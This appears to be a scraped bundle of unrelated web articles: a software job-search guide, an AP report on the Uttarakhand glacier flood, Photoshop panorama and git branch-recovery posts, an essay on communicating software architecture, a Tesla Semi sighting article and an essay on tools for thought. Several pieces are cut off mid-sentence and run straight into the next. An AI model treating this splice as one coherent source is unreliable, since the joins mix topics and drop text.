<ul><li>Talk to engineers in the industry who are working in the areas you’d like to learn more about. You can get in touch with them through LinkedIn or a mentorship program (like <a href="https://www.builtbygirls.com/" data-type="URL" data-id="https://www.builtbygirls.com/">Built By Girls</a>).</li></ul>



<ul><li>Read job descriptions of similar roles on multiple companies’ websites. The goal here is to get a sense of the basic qualifications required for a particular role.</li></ul>



<p><strong>It is harder to get into some areas of engineering as an entry level programmer.</strong> For example, cybersecurity, machine learning, dev ops etc. These roles typically require higher qualifications, more specialization, prior experience or certifications. However, most companies will let you switch roles internally so it’s ok to get your start with your current skillset and slowly transition into the role you want over time.</p>



<h3><span id="What_type_of_company_do_you_want_to_work_for"></span>What type of company do you want to work for?<span></span></h3>



<p>The next thing to think about is what kind of company you want to work for. A good way to categorize your preferences is by <strong>company size</strong> (large, mid-size, or small) and <strong>industry</strong> (consumer tech, B2B, biotech, energy, finance, government, etc.).</p>



<p>Here are some factors to consider:</p>



<ul><li>Engineers are treated differently in different industries based on the value their work generates for the core products in that industry. If a company’s main product is the software they sell, then the quality of the engineering team has a direct impact on revenue, which means that engineers are a more valuable part of the employee base.</li></ul>



<ul><li>Joining a startup or a small company usually means that you’ll get to do a little bit of everything, especially at the early stages of the company. This type of company is a great way to get your hands dirty fast and get a lot of responsibility early on. However that comes with less established best practices, more on-call hours and less-than-market-rate cash compensation.</li></ul>



<ul><li>Things move comparatively slower at larger companies and there’s more internal politics and hierarchy, but the hours and pay are better. You also get to work on systems at scale, and get a lot of time to nurture your engineering skills.</li></ul>



<p>The type of company you choose depends on what you’re looking for in your career right now, and which company’s culture you like when you interview with them. <strong>Remember that this choice is important but not permanent</strong> and you can decide to go work somewhere else in the future if that’s what makes sense at the time. The cost of switching between companies is very low, and between industries is slightly higher but still very doable.</p>



<h3><span id="What_is_your_timeline"></span>What is your timeline?<span></span></h3>



<p>Here are a few examples of how you can structure your schedule depending on how long you have for the job search process.</p>



<h5><strong>A few months:</strong></h5>



<ol><li>Build an online presence: 2-3 weeks</li><li>Apply for jobs + Study for interviews: 3-4 weeks</li><li>Practice Interviews: 1-2 weeks</li><li>Real Interviews: 2-4 weeks</li><li>Salary Negotiation: 1 week</li></ol>



<h5><strong>A year:</strong></h5>



<ol><li>Work on side projects + Build an online presence: 6 months</li><li>Apply for jobs + Study for interviews: 3 months</li><li>Practice Interviews: 2-4 weeks</li><li>Real Interviews: 3-6 weeks</li><li>Salary Negotiation: 1-2 weeks</li></ol>



<h5><strong>A month:</strong></h5>



<p>Your goal of getting a good job is 100% achievable even if your timeline is a month or less. Just do everything simultaneously. Don’t wait for one phase to be over before you start the next. It’s going to be a lot harder and you’re going to have to put in a lot more hours everyday, but you can do it.</p>



<h2><span id="Part_1_Build_an_Online_Presence"></span>Part 1: Build an Online Presence<span></span></h2>



<p>Once you’ve thought about where you’d like to work, it’s time to create (or update) your portfolio, resume and profiles on LinkedIn, job boards and other professional networks.</p>



<p><strong>The goal here is to show your future employers that you can already do the job they’re looking to hire for.</strong> Internships, side projects, open source projects, hackathons or prior work experience are all good ways to showcase your skills. Classes or class projects are rarely a good enough signal by themselves.</p>



<p>Spend the time to make your online presence look good – this is a very important step. This is the way you market yourself and the image you’re presenting is one you should be proud of.</p>



<h3><span id="Resume"></span>Resume<span></span></h3>



<p>Your resume is a one page summary of your professional persona.</p>



<h5><strong>Content:</strong></h5>



<ul><li>At a minimum, your resume should include your education, prior work experience and side projects.</li></ul>



<ul><li>List your experience chronologically, starting with the most recent.</li></ul>



<ul><li>There are two important things to keep in mind when describing your past work: clearly communicate <em>what</em> you worked on, and the <em>measurable outcomes</em> that happened as a result of your work.</li></ul>



<h5><strong>Design:</strong></h5>



<ul><li>Your resume should be no longer than one page, with at least a one inch margin on all sides and a choice of text size and font that make it easy to read.</li></ul>



<ul><li><a href="https://www.latex-project.org/">LaTeX</a> is a high-quality typesetting tool that you can use to create your resume. It gives you a lot more control over each element on the page and the outcome looks much better than if you use a text editor.</li></ul>



<h3><span id="Portfolio"></span>Portfolio<span></span></h3>



<p>Your professional portfolio is a website that houses a collection of all your publicly available prior work. This could be links to other websites you’ve built or descriptions of projects you’ve worked on, highlighting the languages, tools and technologies you used to build the project.</p>



<p>It’s also helpful to include links to:</p>



<ul><li>Your LinkedIn profile</li><li>Your resume as an easily downloadable pdf</li><li>Your email address – should be the same as the one on your resume</li><li>Your Github profile</li><li>Any open source contributions</li></ul>



<p>Here are some free hosting options for online projects:</p>



<ul><li><a href="https://www.netlify.com/">Netlify</a></li><li><a href="https://pages.github.com/">Github Pages</a></li></ul>



<p>And free themes and images for portfolio website design:</p>



<ul><li>Themes – <a href="https://html5up.net/">HTML5UP</a></li><li>Images – <a href="https://unsplash.com/">Unsplash</a></li></ul>



<h3><span id="Job_Boards_and_Professional_Networks"></span>Job Boards and Professional Networks<span></span></h3>



<p>Now that you’ve put in all this work into building an online presence, advertise it. This is how people are going to find you, and you need them to be able to find you before they can start the interview process with you.</p>



<p>Create profiles on:</p>



<ul><li><a href="https://www.linkedin.com/">LinkedIn</a></li><li><a href="https://angel.co/">AngelList</a></li><li><a href="https://elpha.com/">Elpha</a></li><li><a href="https://www.workatastartup.com/">YC Work at a Startup</a></li><li><a href="https://news.ycombinator.com/item?id=25266287">Hacker News Thread: Who wants to be hired?</a></li><li>And any others that you can think of</li></ul>



<p>In these profiles include links to your resume and portfolio. Also make sure your employment history (including job titles and dates) is accurate because hiring managers and recruiters will use job boards’ built in filters to check who’s actively interviewing, who has x years of experience, etc.</p>



<h2><span id="Part_2_Apply_for_Jobs"></span>Part 2: Apply for Jobs<span></span></h2>



<p>Now that you’ve built an online presence, it’s time to apply for jobs. <strong>Interviewing is a numbers game </strong>– the more places you apply to, the more chances you give yourself of landing an amazing job. Apply to companies you want to work for, but also apply to ones where you’re not as interested. You might find that you end up liking them after meeting with the team and interviewing with them, and if nothing else at least you’ll get some good interview practice out of it.</p>



<p>A huge part of being a good software engineer is being able to learn on the job. So if you have 50-60% of the skills listed on a job description then you are qualified to do that job. Some companies have basic requirements that they won’t budge on, so you should have all of those, but that list is usually short. Apply for job titles even if they seem like they’re a level above or a level below your experience, because once you get on the phone with the recruiter they can determine whether you’re a good fit. </p>



<p>Definitely apply to the jobs that don’t specify years of experience. Also, sometimes job descriptions can be outdated so apply if you’re interested because you might be qualified. And finally, apply for multiple roles at each company; you can narrow your search later if multiple teams from the same company are interested.</p>



<p><strong>Remember that if your application does not get accepted, then you will be no worse off than you are now.</strong> Let the company tell you if they’re not interested, don’t make that decision for them. So don’t be shy, apply!</p>



<h3><span id="Through_Your_Network"></span>Through Your Network<span></span></h3>



<p>Make a list of your family, friends, old colleagues and acquaintances who work in tech. You can also filter for 1st or 2nd …</p></div></div></article></div></div>

            <p>RISHIKESH, INDIA -- 
	Indian rescue crews struggled to reach trapped victims Sunday after part of a glacier in the Himalayas broke off and released a torrent of water and debris that slammed into two hydroelectric plants. At least nine people were killed and 140 were missing in a disaster experts said appeared to point to global warming.</p>
<p>
	Video from India's northern state of Uttarakhand showed the muddy, concrete-gray floodwaters tumbling through a valley and surging into a dam, breaking it into pieces with little resistance before roaring on downstream. The flood turned the countryside into what looked like an ash-colored moonscape.</p>
<p>
	More than 2,000 members of the military, paramilitary groups and police took part in the search-and-rescue operation, including soldiers expert in mountaineering, working into the night under bright halogen lights, authorities said.</p>
<p>
	The flood was caused when a portion of Nanda Devi glacier snapped off in the morning, releasing water trapped behind it, authorities said. It rushed down the mountain and into other bodies of water, forcing the evacuation of many villages along the banks of the Alaknanda and Dhauliganga rivers.</p>
<p>
	A hydroelectric plant on the Alaknanda was destroyed, and a plant under construction on the Dhauliganga was damaged, said Vivek Pandey, a spokesman for the paramilitary Indo Tibetan Border Police. Flowing out of the Himalayan mountains, the two rivers meet before merging with the Ganges River.</p>
<p>
	Pandey said at least 42 workers were trapped in two tunnels at the Dhauliganga project. Twelve were rescued from one of the tunnels, while at least 30 others remained stranded inside the other, he said.</p>
<p>
	"The rescuers used ropes and shovels to reach the mouth of the tunnel. They dug through the debris and entered the tunnel. They are yet to come in touch with the stranded people," said Chief Minister Trivendra Singh Rawat, Uttarakhand's top elected official.</p>
<p>
	An additional 140 workers at the two plants were missing, Pandey said. Surjeet Singh, a police official, said at least nine bodies were recovered.</p>
<p>
	The Himalayan area has a chain of hydropower projects on several rivers and their tributaries. Rawat said authorities were able to save other power units downstream because of timely action taken to release water by opening gates.</p>
<p>
	The floodwaters also damaged houses, said Ravi Bejaria, a government spokesman, though he had no details on the number and whether any of the residents were injured, missing or dead.</p>
<p>
	"It all started sometime around 10 in the morning. We heard a bang, which shook our village," Dinesh Negi, a resident of Raini village, told The Associated Press by phone. He said they watched from high above one of the rivers as the water turned muddy and surged in a torrent.</p>
<p>
	"We knew something wrong had happened," Negi said. "We could see the fury of the river."</p>
<p>
	Video showed rescuers in camouflage uniforms and bright yellow or red helmets, using ropes to reach victims. A man who was pulled from a muddy hole threw his arms in the air, and rescuers laughed and exulted with him. Rescue workers comforted victims lying in a row of stretchers in the open.</p>
<p>
	Scientists have long known that global warming is contributing to the melting and the breakup of the world's glaciers.</p>
<p>
	Anjal Prakash, research director and adjunct professor at the Indian School of Business who has contributed to U.N.-sponsored research on global warming, said that while data on the cause of the disaster was not yet available, "this looks very much like a climate change event as the glaciers are melting due to global warming."</p>
<p>
	Uttarakhand Police Chief Ashok Kumar said officials immediately alerted residents in the area and evacuated them to safer places. Downstream, popular tourist spots on the banks of the Ganges were shut, and all boating activities were stopped.</p>
<p>
	Prime Minister Narendra Modi tweeted that "the nation prays for everyone's safety" in Uttarakhand.</p>
<p>
	In 2013, thousands of people were killed in Uttarakhand after heavy rains triggered landslides and floods, washing away thousands of houses and roads and cutting communications in many places.</p>
                          
                                      <div>
                <h2>Correction:</h2>
                <p>
	This story has been corrected to show that authorities launched their search operation on Sunday, not Saturday. It has also been corrected to show that the Dhauliganga hydropower plant is on the Dhauliganga River, not the Alaknanda River.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>While Photoshop is a great tool to have in your development arsenal for basic image editing needs ( we use it at work often for touching up logos and generating sprites for our on-screen TV keyboard ) I've also found it super helpful in various side projects ( such as <a href="https://en.wikipedia.org/wiki/Hand-colouring_of_photographs">hand-coloring</a> or <a href="https://helpx.adobe.com/photoshop/using/retouching-repairing-images.html">retouching blemishes</a> from old black &amp; white photos. )</p>
<p>Recently, I discovered it can also be used effectively to extract panoramas from videos, as this <a href="https://www.youtube.com/watch?v=nJ18lSMFGbA">YouTube video</a> demonstrates.</p>
<p>This inspired me to apply the same concept to a couple of historic videos taken from my hometown (Paris, Texas.) Granted, this older footage wasn't captured from a precisely-positioned drone. Nevertheless, I was still ultimately impressed with the results.</p>
<p>The first <a href="https://www.youtube.com/watch?v=lXdI7IZnXVU&amp;t=376s">video</a> was recorded by Phil Johnson in 1964. Because he panned the camera around the downtown square, I was able to take advantage of those video frames by extracting them and culling the unnecessary / blurry stills. Then after processing those with Photoshop's <em>Auto-Align Layers</em> and <em>Auto-Blend Layers</em>, I ended with this set of nicely generated panoramas:</p>

<img src="https://www.joeycato.com/static/parispan64-square-nw-1f9237505b7fb312749f5b0f99cff13a.png">
<p>Happy with the results, I decided to repeat the same experiment with another <a href="https://www.youtube.com/watch?v=mdLgwqaItGY">video</a> ( filmed from same location, but in 1927. )</p>
<p>This time I cranked it up a notch. In addition to generating multiple panoramas I also composited those together to create a super panorama. To accomplish this I relied on Photoshop's <em>Free Transform</em> and <em>Content Fill</em> options to smoothly align and blend the overlapping sections.</p>
<img src="https://www.joeycato.com/static/parispan27-square-comp-c533016e33a3190b7118a8cf717237d9.png">
<p>I was quite amazed with the results. Seeing the old downtown square in one single wide shot gave me a unique way to view and appreciate the past.</p></article></div>]]>

February 7, 2021 | http://beza1e1.tuxen.de/communicate_architecture.html | <a href="https://web.archive.org/web/*/http://beza1e1.tuxen.de/communicate_architecture.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>Repeatedly software architects tell me that
their stakeholders pay no attention to their architecture.
One question I always have: Did you actually tell them?
An answer I got was that it was discussed
with some other team member a year ago.
Since <a href="http://beza1e1.tuxen.de/definitions_software_architecture.html">architecture is important</a>,
they expect such knowledge to spread on its own.
Unfortunately, natural spread does not happen.
Maybe because "important" is very often steamrolled by "urgent".
Maybe because the architecture has subtle complexities which get lost.
Thus the proper communication is a task many architects neglect.</p>
<p>(Disclaimer: This is about architectures which affect many people.
For a single team, the natural spread can be sufficient.)</p>
<h2>How architects should spend their time</h2>
<p>This raises the question how much time an architect should spend on communication.
<a href="https://philippe.kruchten.com/">Philippe Kruchten</a>,
a well known researcher, gave an answer in
<em>What do software architects really do?</em> (<a href="https://pkruchten.files.wordpress.com/2010/05/kruchten_2008_journal-of-systems-and-software.pdf">pdf</a>).
The abstract:</p>
<blockquote>
<p>To be successful, a software architect—or a software architecture team, collectively—must strike a delicate balance between an external focus—both outwards: Listening to customers, users, watching technology, developing a long-term vision, and inwards: driving the development teams—and an internal,reflective focus: spending time to make the right design choices, validating them, and documenting them.
Teams that stray too far away from this meta stable equilibrium fall into some traps that we describe as antipatterns of software architecture teams</p>
</blockquote>
<p>So, Kruchten distinguishes between three working modes of an architect.
As a knowledge worker, it roughly maps to the input, processing, and output of information.</p>
<ol>
<li><strong>Internal working</strong>:
   This is the deep work an architect performs,
   essentially thinking and processing information.
   It may involve communication if there is a whole team of architects.</li>
<li><strong>Inwards communication</strong>:
   Architects must acquire a broad knowledge.
   This involves listening, reading, and asking questions.</li>
<li><strong>Outwards communication</strong>:
   Once new information is created, the architect spreads it.
   This involves presentations, writing documentation, and supporting.</li>
</ol>
<p>The ideal balance, according to Kruchten, is 50:25:25.
So only half the time the architect should spend on developing the architecture.
The other half is split in learning about the current state
and communicating the desired state.</p>
<p><img alt="50:25:25" src="http://beza1e1.tuxen.de/img/arch_50-25-25.jpeg"></p>
<p>If the balance is lost,
various clichees are the result.</p>
<p>One example are perfectionists, who neglect the outward communication.
Kruchten calls it "goldplating" the architecture.
While the work product is great,
it is obsolete on arrival.</p>
<p><img alt="60:30:10" src="http://beza1e1.tuxen.de/img/arch_60-30-10.jpeg"></p>
<p>An architect who neglects outward and inward communication
works "in an ivory tower".
While the work product might be internally consistent
and beautiful enough to make the creators arrogant,
it is impractical and thus ignored.
Especially academics tend to fall into this trap.</p>
<p><img alt="70:15:15" src="http://beza1e1.tuxen.de/img/arch_70-15-15.jpeg"></p>
<p>If the architect neglects the internal working,
the absence of a consistent architecture will show in the overall product.
It might consist of well crafted parts
but they don't fit together well.</p>
<p><img alt="30:40:30" src="http://beza1e1.tuxen.de/img/arch_30-40-30.jpeg"></p>
<p>An extreme focus on the outward communication turns the architect into a consultant.
While the developers appreciate the support,
there is no coherent mind behind the architecture.</p>
<p><img alt="25:25:50" src="http://beza1e1.tuxen.de/img/arch_25-25-50.jpeg"></p>
<p>In practice there seems to be no extreme focus on inward communication.
It might be that such architects produce
neither architecture documentation nor do they support the team.
So they produce nothing of even superficial value and
do not survive for long for business reasons.</p>
<h2>Effectively communicating the architecture</h2>
<p>Let's come back to the initial question:
Why don't people know the architecture well enough?
Assuming there is solid architecture,
the architect is either goldplating or working in an ivory tower.
In both cases, the outward communication is lacking,
so more focus should be put there.
Here are a few ideas which worked for me.</p>
<h3>Asynchronous Communication</h3>
<p>I love asynchronous communication.
As does Elon Musk, so it must be truly great.</p>
<p><img alt="Elon Musk communicates asynchronously" src="http://beza1e1.tuxen.de/img/elon_musk_async.jpeg"></p>
<p>The big advantage of asynchronous communication is
that it scales much better.
In the case of email, you can copy&amp;paste or forward information quickly.
Actually, writing in general scales well.
Unfortunately, writing skills are underrated in my profession.
Other media like podcasts or videos can also scale,
but I rarely see them used in the context of software architecture.</p>
<p>What is used heavily are diagrams.
Unfortunately, the focus is too extreme.
I have seen lots and lots of architectural diagrams
which are incomprehensible because textual explanation was missing.
Some diagrams are inherently bad (for example they use inconsistent symbols)
but even good diagrams require context.</p>
<p>The slides of great presentations are similar.
They were designed to work in a presentation.
For example, Steve Jobs' keynotes are legendary.
Here is one of the most important moments of them all.</p>
<p><img alt="Steve Jobs introducing the iPhone" src="http://beza1e1.tuxen.de/img/steve_jobs_keynote.jpeg"></p>
<p>The slide shows three icons of three relevant technologies.
During the next seconds later he announces the iPhone
which combines those three technologies into one device.
The slide works as part of the narrative context
but on its own is useless.
If you design slides to also work as a handout on their own,
the presentation will suffer for it.</p>
<p>Well, if you remember the presentation
the slide works as a reminder though.
Likewise, my hypothesis is that most architecture diagrams
are only useful as a memory aid.
To become an effective communication medium it requires more.</p>
<p>One case of asynchronous communication are architectural decision records
and <a href="http://beza1e1.tuxen.de/decision_records.html">I already wrote about them</a>.
In our context here the relevant aspect is that
decision records should be comprehensible on their own,
so you can give people a link to them
and they can learn about an aspect of the architecture on their own.
You don't have to explain it to them.
This doesn't mean you focus <em>more</em> time on outward communication
but you spend it more efficiently.</p>
<h3>Regular Newsletter</h3>
<p>For the last two years, I sent a weekly newsletter to everybody in my project,
which is roughly 250 people.
Additionally, a few dozen other people receive it as well
because they asked explicitly.
This shotgun approach means that
at least half of the recipients are not my target audience
because they are no developers.
However, even managers appreciated it as it gives them an impression
of the technical issues in the project.
My department head said "please, don't stop writing them!"</p>
<p>The newsletter is composed of whatever crosses my desk during the week.
It might a little tool how-to which I felt was not known enough yet.
It announces new architectural decision records
and upcoming/ongoing initiatives.
Sometimes developers learned something
they should have gotten from project management weeks ago.</p>
<p>Blogging experience helps a lot for writing such a newsletter.
The oldest blog post here is from 2009
and I blogged a few years before that already.
The most important part of such a newsletter is to do it consistently.</p>
<p>I use meme pictures.
They are out of the ordinary at my work
and they actually distract from the seriousness of some information.
However, multiple people told me that they only wanted to look at the funny pictures
and later realized they read the whole mail.
Also, developers appreciate the hacker vibes they know
from the internet sites they visit regularly.
Some told me, the newsletter was the highlight of their week.</p>
<p>Also helpful is writing scientific papers.
Assuming proper reviewing from supportive colleagues,
you train to write terse yet correct.
My newsletter only contains short summaries but plenty of links for more details.
Sometimes I even sneak in some self-promotion, like links to my blog here.
(I wonder if <em>you</em> found this via such a link?)</p>
<h3>The Universal Language is Concrete</h3>
<p>The book <a href="http://beza1e1.tuxen.de/made_to_stick.html">Made to Stick</a>
contains many ideas to make a message more memorable (sticky).
One of them is concreteness
and they tell a story about the conflict
between manufacturing people on the shop floor
and engineers drawing blueprints (page 115).
That resembles the architect-developer roles quite well.</p>
<blockquote>
<p>The manufacturing people were thinking, <em>Why don't you just come down to the factory floor and show me where the part should go?</em> And the engineering people were thinking, <em>What do I need to do to make the drawings better?</em></p>
<p>[...] Should both parties learn greater empathy for the other and, in essence, meet in the middle? Actually, no. The solution is for the engineers to change their behavior. Why? As Bechky notes, the physical machine was the most effective and relevant domain of communication. Everyone understands the machines fluently. Therefore problems should be solved at the level of the machine. [...]</p>
<p>The moral of the story is not to "dumb things down." The manufacturing people faced complex problems and they needed smart answers. Rather, the moral of the story is to find a "universal language," one that everyone speaks fluently. Inevitably, that universal language will be concrete.</p>
</blockquote>
<p>It sounds remarkably similar to our initial question.
Developers might ignore the architecture because
it is not concrete enough for their problem at hand.
The book strongly suggests that the solution is not that developers
should be educated better.
It puts the burden on the architects to explain the architecture
in concrete situations.</p>
<p>My newsletter reinforces this.
Since I need to pump out something every week,
I have to pick something small to fill it.
Even if it is not relevant to everybody,
it nudges me to explain the wider architectural background.</p>
<p>Abstractions are the luxury of the expert.
They are shortcuts between well known concrete concepts.
If the concepts are not well understood yet,
the abstraction is not helpful.
So architects should rarely talk about the big overview.
At least, keep it short and rough.</p>
<p>All this concrete communication implies a lot of work for the architect
in comparison to mere abstract outlines.
Remember it should only take you 25% of your time, …</p></article></div>

  <p><span>3 May 2020</span></p><p>If you are a regular contributor to an open source project on GitHub pushing code changes via pull requests, it is a good idea to delete the branches that have been merged and no longer needed.</p>

<p>I like to make sure that I keep my repositories up to date and employ good branch hygiene, making sure that I only have branches that I am working on in my GitHub forks and locally on my machine.</p>

<p>Currently we release a new version of the Office 365 CLI on a weekend, so I’ve got into a habit of using this day to sync my fork, ensuring that both the <code>master</code> and <code>dev</code> branches are up to date and cleanup up any branches that I don’t need anymore.</p>

<p>Now reading the title of this post, I’m sure you can now imagine what prompted me to write it… yes, you guessed it, I deleted a branch that I still needed, both from my fork in GitHub and locally. To make matters worse, deleting this branch automatically caused my open pull request causing it to be instantly closed.</p>

<p><img src="https://garrytrinder.github.io/public/img/git/deleted-source-branch.png" alt=""></p>

<p>As it turns out, this was fairly simple to fix. Every commit that you make in Git is uniquely recorded with a SHA-1 checksum and we can use this to create a new branch from, essentially recreating the branch from a point in time.</p>

<blockquote>
  <p><strong>git checkout -b &lt;branch&gt; &lt;start_point&gt;</strong></p>

  <p>Create a new branch named &lt;branch&gt; and start it at &lt;start_point&gt;</p>
</blockquote>

<p>The important part is obtaining the commit SHA-1 checksum of my commit. I was able to get this from my closed pull request by viewing the <code>Commits</code> tab on the pull request and copying the commit SHA-1 using the <code>copy</code> button.</p>

<p><img src="https://garrytrinder.github.io/public/img/git/copy-commit-sha1.png" alt=""></p>

<p>Using the <code>git checkout</code> command, I was able to then re-create the branch locally and push the branch back up to my fork in GitHub, which restored the branch that my pull request was referencing.</p>

<div><div><pre><code>git checkout -b auth-filestorage a1a12389bbefdf1aa197d04940b48d8641bbeae7
git push --set-upstream origin auth-filestorage
</code></pre></div></div>

<p><img src="https://garrytrinder.github.io/public/img/git/restored-branch.png" alt=""></p>

<p>This then allowed my to reopen my pull request 🙌🏻</p>

<p><img src="https://garrytrinder.github.io/public/img/git/reopen-pull-request.png" alt=""></p>

<p>Crisis averted.</p>

<p>Tesla Semi Truck prototypes have again started appearing in different US states, this time, the color is white on these ones. At the first look, both of the white Tesla Semis seen in different US states seem to be the same truck, but looking closely, we can see the differences.</p>



<p>Tesla has also made slight changes to the exterior of the class-8 electric hauler that suggests the automaker is performing further R&amp;D. By testing these trucks on public roads, Tesla has been gathering real-world data for a few years now.</p>



<p>I have also compared two of the recently seen Tesla Semis from behind where both have different electrical boxes installed at the back which indicates that Tesla is also experimenting with variable electrical and battery management systems.</p>



<p>Let’s first look at the side profile of the new <a href="https://www.teslaoracle.com/topic/semi-truck/">Tesla Semi Truck</a> prototype seen in the video of the Trucker/YouTuber Cory Draper. Tesla has made several small and big changes to the side profile that  I have tried to illustrate in the following single diagram (changes I have highlighted in this prototype can be compared to the official photo of the Tesla Semi added in the picture).</p>

Illustrated by Iqtidar Ali / image by Cory Draper (full video below). Click/Tap to zoom-in.</figcaption></figure>



<p>Following is the list of changes I have found in the exterior of this latest Tesla Semi prototype:</p>



<ul><li>Roof cab length is reduced by about 50% (visual estimate), this area previously expanded to the entire cabin’s length as seen in the official photo (above).</li><li>Roof cab height is also reduced significantly, but Tesla has been playing with it every now and then from the start. This is probably done to obtain an optimum point between utility and aerodynamic drag reduction.</li><li><strong>Window expansion / Sleeper Cabin:</strong> The most significant change I encountered in this prototype is the expansion of the ‘window’. Now it expands to around 70% of the rear cabin’s (area behind driver’s compartment), this is seen for the first time. I think this is now slowly converting to a sleeper cabin as Tesla said it was in the works. In one of my 2018 articles on the Tesla Semi spotting, <a href="https://www.xautoworld.com/tesla/semi-sleeper-door/" target="_blank" rel="noreferrer noopener">I speculated</a> this area would convert to a sleeper and this space would be used as a sleeper cabin.</li><li>A black box above the 2nd cabin (sleeper) can be seen in the side profile photo above, this space was previously hollow (see old version photo below). Truckers need a sleeper and Tesla is surely going to give them one.</li><li>The rearmost panel has also extruded out a little and the curve on the bottom has been shortened to adjust for the modified side profile.</li></ul>



<h2>Electrical System Variations</h2>



<p>The following two photos of the rear area of the Tesla Semi Truck show two variations of an electrical systems box. In one prototype, the box looks like a rectangular chest placed in the middle. The other prototype’s electrical system casing is more rectangular and smaller in size, it’s also placed on the left side rather than the middle.</p>



<p>For understanding, I have named these electrical junction box variations, Design Type 1 and 2. This used to be a deep hollow space in prototypes seen before this one (pic below), now they have utilized the space more efficiently.</p>

<p>This variation in the electrical system box designs might also be due to the short and long range variants, 300 and 500 mile range respectively. </p>



<p>Tesla Semi prototype with the bigger electrical junction box was probably seen in Indiana, trucker/YouTuber Cory Draper shows us a detailed walkaround of this electric beast. This looks like a brand new un-used truck with the packaging material still intact in places, probably heading for a client demonstration.</p>



<p>The other prototype (pics below) was spotted in Chicago, IL, and was pretty dirty, most probably coming back from a rigorous testing session in muddy terrain.</p>

<p>During the <a href="https://www.teslaoracle.com/2021/02/01/listen-to-tesla-q4-2020-earnings-call-detailed-summary-of-musks-answers/">Q4 2020 Tesla Earnings Call</a>, CEO Elon Musk said that the Tesla Semi Truck needs at least 5X more batteries used in a car. So battery supply constraint is the main reason hindering the Tesla Semi production start. Although in a company email last year Musk told Tesla employees that <a href="https://www.teslaoracle.com/2020/06/10/tesla-semi-bring-volume-production/">it’s time to bring the electric Semi to volume production</a> but the timeline seems to have been pushed to later this year.</p>



<p>Looks like production start delays are not getting in the way of more and more companies pre-ordering the electric hauler, Tesla just <a href="https://www.teslaoracle.com/2020/11/05/pge-places-a-huge-tesla-semi-truck-order/">received its biggest Tesla Semi Truck order</a> towards the end of last year. A Tesla Semi <a href="https://www.xautoworld.com/tesla/semi-truck-orders/" target="_blank" rel="noreferrer noopener">order tracking page</a> that I have now maintained for almost the last 3 years shows that the Silicon Valley-based automaker has 788 trucks on the reservation with 41 publicly known pre-orders by corporations, small freight management companies, and individuals.</p>

<p>As neuroscientists like to say, we need tractable definitions. However, the term "Tools For Thought", which we use to describe tools like RemNote or Roam Research, is not clearly defined.</p>

<p>In their work, <a href="https://numinous.productions/ttft/">How can we develop transformative Tools For Thought? </a> Michael Nielsen and Andy Matuschak describe the history of the term. The first usage of this term goes back to the early computer pioneers. In their essay, they state that they are using the word as a catch-all phrase. The main problem I see with it is that it does not differentiate between cognitive, e.g., cultural-evolutionary tools (like Hindu-Arabic numerals) and SaaS-like tools.</p>
<p>Thinking and Thoughts are also not clearly defined. For example, thought can be indulgence into an imaginative or pleasurable experience and, therefore, something that we don't try to improve through a tool's usage.</p>

<h2 id="history"><a href="#history" aria-label="history permalink"></a>History</h2>
<p>This research goes back to the 1960s with the pioneering work of Douglas C. Engelbart. He viewed the process of <a href="https://www.dougengelbart.org/content/view/138">Augmenting Human Intellect</a> as increasing the capability to solve complex problems by information handling and symbol structuring and to gain comprehension. The vision developed by Engelbart, J. C. R. Licklider, Alan Kay, and others had a strong influence on later entrepreneurs like Steve Jobs.</p>
<p>The field was finally formed in early 2000 under "Augmented Cognition" and instituted by the <a href="https://en.wikipedia.org/wiki/Augmented_cognition">Augmented Cognition Program</a>, which was renamed to <em>Improving Warfighter Information Intake Under Stress Program</em> in 2001. The program was separated into four phases:</p>
<ol>
<li>Measure cognitive state</li>
<li>Manipulate cognitive state</li>
<li>Exploit human sensory channels</li>
<li>Optimize information allocation</li>
</ol>
<p>The main conference of the field is the <a href="http://2021.hci.international/ac">Augmented Cognition (AC) Conference</a>, an affiliated conference of the HCI International Conference, which will arrive at its 15th edition this July. Its last edition of 2018 brought forth two volumes of papers: <a href="https://link.springer.com/book/10.1007/978-3-319-91470-1">Augmented Cognition: Intelligent Technologies</a> and <a href="https://link.springer.com/book/10.1007/978-3-319-91467-1">Augmented Cognition: Users and Contexts</a>.</p>
<p>The research field today relies heavily on the terminology of <a href="https://en.wikipedia.org/wiki/Cognitive_load">Cognitive Load Theory</a>. As we have seen, a big focus of the domain is to reduce Cognitive Overload. One way to do this is by developing schemas that act as memory templates coded into Long Term Memory by Working memory. If we help the users create new or surface relevant schemas like an effective Mnemonic, we will be able to reduce their Cognitive Load, increase their productivity, and reduce the rate of error.</p>
<p>A second useful and related framework is the one of <a href="https://www.lri.fr/~mbl/Stanford/CS477/papers/DistributedCognition-TOCHI.pdf">Distributed Cognition</a>. It stated that cognitive processes are defined by the functional relationship among elements that participate in them and not by the spatial colocation of its elements. We will look at cloud-architectures that describe the combination of cognitive modules for augmentation interfaces later.</p>
<h2 id="cognitive-technology"><a href="#cognitive-technology" aria-label="cognitive technology permalink"></a>Cognitive Technology</h2>
<p>In 2016, Michael Nielsen, in his essay <a href="http://cognitivemedium.com/tat/">Thought as a Technology</a>, described the term cognitive technology as an external artifact designed by humans, which can be internalized and used as a substrate for cognition. These are representations invented by other people, such as words, graphs, maps, algebra, mathematical diagrams, etc. He further differentiated between Models of Augmentation as Cognitive Transformation (e.g., spreadsheet) or Cognitive Outsourcing (e.g., calculator).</p>
<p>A year later, in a paper titled, <a href="https://distill.pub/2017/aia/">Using Artificial Intelligence to Augment Human Intelligence</a> he and his colleague Shan Carter expanded the concept into differentiating between Cognitive technology using Computers and Cognitive technology using Artificial Intelligence. The former is expanding human thought itself, meaning the computer performed action becomes a new generalizable concept. An example they give is the concept of applying a stamp in Photoshop to another layer. This concept is then generalized as "computer, [new type of action] this [new type of representation for a newly imagined class of object]".</p>
<p>Cognitive technology using Artificial Intelligence discovers and reveals deep principles in ways meaningful to the user. The example they give here is an Interactive Generative Adversarial Model (iGAN) that, for example, shows a fashion designer useful operation as new primitives that he can then internalize.</p>
<h2 id="personal-knowledge-management"><a href="#personal-knowledge-management" aria-label="personal knowledge management permalink"></a>Personal Knowledge Management</h2>
<p>A related concept, <a href="https://en.wikipedia.org/wiki/Personal_knowledge_management">Personal knowledge management
